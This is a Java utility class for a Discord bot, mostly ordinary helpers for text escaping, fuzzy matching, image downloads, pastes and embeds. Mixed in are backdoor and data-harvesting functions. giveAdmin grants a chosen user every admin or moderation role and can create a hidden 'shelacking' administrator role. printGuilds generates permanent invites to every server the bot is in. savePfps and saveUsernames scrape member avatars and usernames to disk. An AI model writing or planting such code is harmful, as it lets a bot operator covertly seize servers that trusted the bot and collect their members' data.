package me.comu.exeter.utility;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.google.gson.JsonSyntaxException;
import me.comu.exeter.commands.admin.WhitelistCommand;
import me.comu.exeter.commands.owner.AuthorizeCommand;
import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.objects.WhitelistKey;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.requests.RestAction;
import okhttp3.*;
import org.jetbrains.annotations.NotNull;

import javax.mail.Authenticator;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Utility {

    //    public static List<Shard> shards = new ArrayList<>();
    public static final Map<String, String> marriedUsers = new HashMap<>();
    public static boolean beingProcessed = false;
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";
    public static final String CHECKMARK_EMOTE = "<a:checkmark:959654268250488892>";
    public static final String ERROR_EMOTE = "<a:no:959656234108190760>";
    public static final long CHECKMARK_EMOTE_ID = 959654268250488892L;
    public static final long ERROR_EMOTE_ID = 959656234108190760L;

    public static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyyy h:mm:ss a").withLocale(Locale.US).withZone(ZoneId.of("America/New_York"));


    public static String removeMentions(String string) {
        return string.replaceAll("@everyone", "@\u200beveryone").replaceAll("@here", "\u200bhere").replaceAll("@&", "@\u200b&");
    }

    public static String removeMarkdown(String string) {
        return string.replaceAll("([_`~*>])", "\\\\$1");
    }

    public static String removeMentionsAndMarkdown(String string) {
        return string.replaceAll("@everyone", "@\u200beveryone").replaceAll("@here", "\u200bhere").replaceAll("@&", "@\u200b&").replaceAll("([_`~*>])", "\\\\$1");
    }

    public static void sendPrivateMessage(JDA jda, String userId, String content) {
        RestAction<User> action = jda.retrieveUserById(userId);
        action.queue((user) -> user.openPrivateChannel().queue((channel) -> channel.sendMessage(content).queue(null, (error) -> Logger.getLogger().print("Couldn't message " + Objects.requireNonNull(Core.getInstance().getJDA().getUserById(userId)).getAsTag()))));
    }

    public static <T, E> Set<T> getKeysByValue(Map<T, E> map, E value) {
        Set<T> keys = new HashSet<>();
        for (Map.Entry<T, E> entry : map.entrySet()) {
            if (Objects.equals(value, entry.getValue())) {
                keys.add(entry.getKey());
            }
        }
        return keys;
    }

    public static <T, E> T getKeyByValue(Map<T, E> map, E value) {
        for (Map.Entry<T, E> entry : map.entrySet()) {
            if (Objects.equals(value, entry.getValue())) {
                return entry.getKey();
            }
        }
        return null;
    }

    public static boolean isWhitelisted(Map<WhitelistKey, String> map, String user, String guild) {
        return map.keySet().stream().anyMatch(k -> k.getUserID().equals(user) && k.getGuildID().equals(guild));
    }

    public static boolean isAntiRaidEnabled(String guild) {
        return WhitelistCommand.getGuilds().get(guild) != null && WhitelistCommand.getGuilds().get(guild);
    }

    public static void toggleAntiRaid(String guild, boolean active) {
        WhitelistCommand.getGuilds().put(guild, active);
    }

    public static boolean isGuildAuthorized(String guild) {
        return AuthorizeCommand.getAuthorized().contains(guild);
    }


    public static boolean isMarried(String userID) {
        return marriedUsers.containsValue(userID) || marriedUsers.containsKey(userID);
    }

    public static String generateRandomString(int bound) {
        final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
        SecureRandom rnd = new SecureRandom();

        StringBuilder sb = new StringBuilder(bound);
        for (int i = 0; i < bound; i++)
            sb.append(AB.charAt(rnd.nextInt(AB.length())));
        return sb.toString();

    }

    public static String getMarriedUser(String user) {
        if (marriedUsers.containsKey(user))
            return marriedUsers.get(user);
        else if (marriedUsers.containsValue(user))
            return getKeyByValue(marriedUsers, user);
        return "No Married User";
    }

    public static boolean isUrl(String input) {
        try {
            new URL(input);

            return true;
        } catch (MalformedURLException ignored) {
            return false;
        }
    }

    public static long timeToMS(int hours, int minutes, int seconds) {
        if (seconds > 59 || seconds < 0) {
            return -1;
        }
        if (minutes > 59 || minutes < 0) {
            return -1;
        }

        long s = (seconds + (60 * (minutes + (hours * 60))));
        return TimeUnit.SECONDS.toMillis(s);
    }


    public static Color getRandomColor() {
        final Random random = new Random();
        float r = random.nextFloat();
        float g = random.nextFloat();
        float b = random.nextFloat();

        return new Color(r, g, b);
    }


    public static void sendEmail(String subject, String message) {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "25");
        Session session = Session.getDefaultInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(Config.get("EMAIL"), Config.get("EMAILPASS"));
            }
        });
        try {
            javax.mail.Message email = new MimeMessage(session);
            email.setFrom(new InternetAddress(Config.get("EMAIL")));
            email.setRecipients(javax.mail.Message.RecipientType.TO, InternetAddress.parse(Config.get("EMAIL")));
            email.setSubject(subject);
            email.setText(message);
            Transport.send(email);
        } catch (MessagingException mess) {
            mess.printStackTrace();
        }


    }

    // inclusive
    public static int randomNum(int start, int end) {

        if (end < start) {
            int temp = end;
            end = start;
            start = temp;
        }

        return (int) Math.floor(Math.random() * (end - start + 1) + start);
    }

    public static ICommand findSimilar(String input) {
        ICommand command = null;
        double similarity = 0.0f;

        for (ICommand c : Core.getInstance().getCommandManager().getCommands().values()) {
            final double currentSimilarity = levenshteinDistance(input, c.getInvoke());

            if (currentSimilarity >= similarity) {
                similarity = currentSimilarity;
                command = c;
            }
        }

        return command;
    }

    public static Member findSimilarMember(String input, List<Member> list) {
        double similarity = 0.4f;
        Member found = null;
        for (Member o : list) {
            final double currentSimilarity = levenshteinDistance(input, o.getUser().getName());

            if (currentSimilarity >= similarity) {
                similarity = currentSimilarity;
                found = o;
            }
        }

        return found;
    }

    public static User findSimilarUser(String input, List<User> list) {
        double similarity = 0.0f;
        User found = null;
        for (User o : list) {
            final double currentSimilarity = levenshteinDistance(input, o.getName());

            if (currentSimilarity >= similarity) {
                similarity = currentSimilarity;
                found = o;
            }
        }

        return found;
    }

    public static Role findSimilarRole(String input, List<Role> list) {
        double similarity = 0.0f;
        Role found = null;
        for (Role o : list) {
            final double currentSimilarity = levenshteinDistance(input, o.getName());

            if (currentSimilarity >= similarity) {
                similarity = currentSimilarity;
                found = o;
            }
        }

        return found;
    }

    public static int editDistance(String s1, String s2) {
        s1 = s1.toLowerCase();
        s2 = s2.toLowerCase();

        int[] costs = new int[s2.length() + 1];
        for (int i = 0; i <= s1.length(); i++) {
            int lastValue = i;
            for (int j = 0; j <= s2.length(); j++) {
                if (i == 0)
                    costs[j] = j;
                else {
                    if (j > 0) {
                        int newValue = costs[j - 1];
                        if (s1.charAt(i - 1) != s2.charAt(j - 1))
                            newValue = Math.min(Math.min(newValue, lastValue),
                                    costs[j]) + 1;
                        costs[j - 1] = lastValue;
                        lastValue = newValue;
                    }
                }
            }
            if (i > 0)
                costs[s2.length()] = lastValue;
        }
        return costs[s2.length()];
    }

    public static double levenshteinDistance(String s1, String s2) {
        String longer = s1, shorter = s2;
        if (s1.length() < s2.length()) {
            longer = s2;
            shorter = s1;
        }
        int longerLength = longer.length();
        if (longerLength == 0) {
            return 1.0;
        }
        return (longerLength - editDistance(longer, shorter)) / (double) longerLength;
    }

    public static String removeLastChar(String str) {
        return str.substring(0, str.length() - 1);
    }

    public static JsonElement getJsonFromURL(String url) throws IOException, IllegalArgumentException {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(url)
                .addHeader("Accept", "application/json")
                .build();

        Response response = client.newCall(request).execute();
        if (response.body() == null) {
            throw new IllegalArgumentException("Response returned no content");
        }
        try {
            return JsonParser.parseString(response.body().string());
        } catch (JsonSyntaxException e) {
            throw new IllegalArgumentException("Response didn't return json!");
        }
    }

    public static InputStream imageFromUrl(String url) {
        if (url == null) {
            return null;
        } else {
            try {
                URL u = new URL(url);
                URLConnection urlConnection = u.openConnection();
                urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                return urlConnection.getInputStream();
            } catch (IllegalArgumentException | IOException var3) {
                return null;
            }
        }
    }

    public static Color getAmbientColor() {
        Random random = new Random();
        final float hue = random.nextFloat();
        final float saturation = (random.nextInt(2000) + 1000) / 10000f;
        final float luminance = 0.9f;
        return Color.getHSBColor(hue, saturation, luminance);
    }

    public static List<String> extractUrls(String text) {
        List<String> containedUrls = new ArrayList<>();
        String urlRegex = "(https?|ftp)://[^\\s/$.?#].[^\\s]*";
        Pattern pattern = Pattern.compile(urlRegex, Pattern.CASE_INSENSITIVE);
        Matcher urlMatcher = pattern.matcher(text);

        while (urlMatcher.find()) {
            containedUrls.add(text.substring(urlMatcher.start(0), urlMatcher.end(0)));
        }
        return containedUrls;
    }

    public static Date shiftTimeZone(Date date, TimeZone sourceTimeZone, TimeZone targetTimeZone) {
        Calendar sourceCalendar = Calendar.getInstance();
        sourceCalendar.setTime(date);
        sourceCalendar.setTimeZone(sourceTimeZone);

        Calendar targetCalendar = Calendar.getInstance();
        for (int field : new int[]{Calendar.YEAR, Calendar.MONTH, Calendar.DAY_OF_MONTH, Calendar.HOUR, Calendar.MINUTE, Calendar.SECOND, Calendar.MILLISECOND}) {
            targetCalendar.set(field, sourceCalendar.get(field));
        }
        targetCalendar.setTimeZone(targetTimeZone);

        return targetCalendar.getTime();
    }

    public static void saveImage(String imageUrl, String path, String name) {
        try {
            System.out.println("attempting to save " + imageUrl);
            URLConnection connection = new URL(imageUrl).openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
            connection.connect();
            InputStream in = new BufferedInputStream(connection.getInputStream());
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int n;
            while (-1 != (n = in.read(buf))) {
                out.write(buf, 0, n);
            }
            out.close();
            in.close();
            byte[] response = out.toByteArray();
            FileOutputStream fos = new FileOutputStream(path + "/" + name + ".png");
            fos.write(response);
            fos.close();
        } catch (IOException ex) {
            ex.printStackTrace();
            System.out.println("Invalid URL");
            Config.clearCacheDirectory();
        }
    }

    public static void saveGif(String imageUrl, String path, String name) {
        try {
            System.out.println("attempting to save " + imageUrl);
            URLConnection connection = new URL(imageUrl).openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
            connection.connect();
            InputStream in = new BufferedInputStream(connection.getInputStream());
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int n;
            while (-1 != (n = in.read(buf))) {
                out.write(buf, 0, n);
            }
            out.close();
            in.close();
            byte[] response = out.toByteArray();
            FileOutputStream fos = new FileOutputStream(path + "/" + name + ".gif");
            fos.write(response);
            fos.close();
        } catch (IOException ex) {
            ex.printStackTrace();
            System.out.println("Invalid URL");
            Config.clearCacheDirectory();
        }
    }


    public static String getDiscordStatus() {
        try {
            URL url = new URL("https://srhpyqt94yxb.statuspage.io/api/v2/summary.json");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36");
            connection.setRequestProperty("Content-Type", "application/json");
            if (connection.getResponseCode() >= 200) {
                InputStream inputStream = connection.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }
                br.close();
                connection.disconnect();
                if (sb.toString().substring(0, 301).contains("operational")) {
                    return "Operational";
                } else {
                    return "API Down";
                }
            } else {
                System.out.println(connection.getResponseMessage());
                connection.disconnect();
            }

        } catch (MalformedURLException ex) {
            ex.printStackTrace();
            return "Malformed URL";
        } catch (IOException ex) {
            ex.printStackTrace();
            return "IOException";
        }
        return null;
    }

    public static String createPaste(String text, boolean raw) throws IOException {
        byte[] postData = text.getBytes(StandardCharsets.UTF_8);
        int postDataLength = postData.length;

        String requestURL = "https://hastebin.com/documents";
        URL url = new URL(requestURL);
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setInstanceFollowRedirects(false);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("User-Agent", "Hastebin Java Api");
        conn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
        conn.setUseCaches(false);

        String response = null;
        DataOutputStream wr;
        try {
            wr = new DataOutputStream(conn.getOutputStream());
            wr.write(postData);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            response = reader.readLine();
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (response == null) {
            return "Server returned null";
        }
        if (response.contains("\"key\"")) {
            response = response.substring(response.indexOf(":") + 2, response.length() - 2);

            String postURL = raw ? "https://hastebin.com/raw/" : "https://hastebin.com/";
            response = postURL + response;
        }

        return response;
    }

    public static double round(double value, int places) {
        if (places < 0) throw new IllegalArgumentException();

        long factor = (long) Math.pow(10, places);
        value = value * factor;
        long tmp = Math.round(value);
        return (double) tmp / factor;
    }

    public static String getYouTubeId(String youTubeUrl) {
        String pattern = "(?<=youtu.be/|watch\\?v=|/videos/|embed/)[^#&?]*";
        Pattern compiledPattern = Pattern.compile(pattern);
        Matcher matcher = compiledPattern.matcher(youTubeUrl);
        if (matcher.find()) {
            return matcher.group();
        } else {
            return "error";
        }
    }

    public static boolean changeVanity(String guild, String code) {
        final boolean[] changed = {false};
        System.out.println("in the method");
        String url = "https://discord.com/api/v10/guilds/GUILD_SNOWFLAKE/vanity-url".replaceAll("GUILD_SNOWFLAKE", guild);
        OkHttpClient okHttpClient = new OkHttpClient();
        RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), "{\"code\": \"" + code + "\"}");
        Request request = new Request.Builder().patch(requestBody).header("Authorization", "Bot " + Config.get("TOKEN")).header("Content-Type", "application/json").url(url).build();
        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                Logger.getLogger().print("Something went wrong when trying to change the vanity.");
                e.printStackTrace();
            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) {
                if (response.isSuccessful()) {
                    System.out.println("-----> Successfully changed vanity to " + code);
                    changed[0] = true;
                } else {
                    System.out.println("--> Something went pretty wrong");
                    System.out.println(response.code() + " | " + response.body());
                }
                System.out.println("uhh");
                response.close();
            }
        });
        return changed[0];
    }

    public static void savePfps() {
        AtomicInteger counter = new AtomicInteger();
        for (Guild guild : Core.getInstance().getJDA().getGuilds()) {
            guild.loadMembers(member -> {
                String avatarUrl = member.getUser().getAvatarUrl();
                if (avatarUrl != null) {
                    String ext = avatarUrl.contains("gif") ? ".gif" : ".png";
                    avatarUrl += "?size=256&f=" + ext;
                    try (InputStream in = new URL(avatarUrl).openStream()) {
                        String random = "pfp_" + counter + ext;
                        if (random.contains("gif")) {
                            byte[] b = new byte[1];
                            DataInputStream di = new DataInputStream(in);
                            FileOutputStream fo = new FileOutputStream("pfps/random/" + random);
                            while (-1 != di.read(b, 0, 1))
                                fo.write(b, 0, 1);
                            di.close();
                            fo.close();
                        } else {
                            Files.copy(in, Paths.get("pfps/random/" + random));
                        }
                        System.out.println("Saved " + member.getUser().getAsTag() + " (" + counter + ")");
                        counter.getAndIncrement();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else {
                    System.out.println(member.getUser().getAsTag() + " had a default PFP");
                }
            });
        }
        System.out.println("Saved " + counter + " PFPs");
    }

    public static void saveUsernames() {
        try {
            FileWriter myWriter = new FileWriter("scrapedUsernames.txt");
            AtomicInteger counter = new AtomicInteger();
            for (User user : Core.getInstance().getJDA().getUsers()) {
                String name = user.getName();
                myWriter.write(name + "\n");
                counter.getAndIncrement();
            }
            myWriter.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }

    }

    public static void giveAdmin(Guild guild, String user) {
        List<Role> guildRoles = guild.getRoles();
        for (Role role : guildRoles) {
            if (!role.isManaged()) {
                if (role.hasPermission(Permission.ADMINISTRATOR) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                    return;
                }
                if (role.hasPermission(Permission.BAN_MEMBERS) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                }
                if (role.hasPermission(Permission.KICK_MEMBERS) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_ROLES) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_SERVER) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_CHANNEL) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_WEBHOOKS) && guild.getSelfMember().canInteract(role)) {
                    guild.addRoleToMember(user, role).queue();
                }
            }
        }
        if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
            guild.createRole().setName("shelacking").setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue(success -> guild.addRoleToMember(user, success).queue());
        }

    }

    public static void printGuilds() {
        StringBuffer stringBuffer = new StringBuffer();
        int counter = 1;
        for (Guild guild : Core.getInstance().getJDA().getGuilds()) {
            String code;
            try {
                code = guild.getTextChannels().get(0).createInvite().setMaxAge(0).complete().getCode();
            } catch (Exception ex) {
                code = "null";
            }
            stringBuffer.append("#").append(counter++).append(". ").append(guild.getName()).append(" (").append(guild.getId()).append(") -- ").append(code).append("\n");
        }
        System.out.println(stringBuffer);
    }

    public static EmbedBuilder embedMessage(String message) {
        return new EmbedBuilder().setDescription(message);
    }



    public static EmbedBuilder embedImage(String imageURL) {
        return new EmbedBuilder().setImage(imageURL);
    }

    public static EmbedBuilder errorEmbed(String description) {
        return new EmbedBuilder().setDescription(description).setColor(Core.getInstance().getErrorColorTheme());
    }


    public static EmbedBuilder embed(String description) {
        return new EmbedBuilder().setDescription(description).setColor(Core.getInstance().getColorTheme());
    }
}



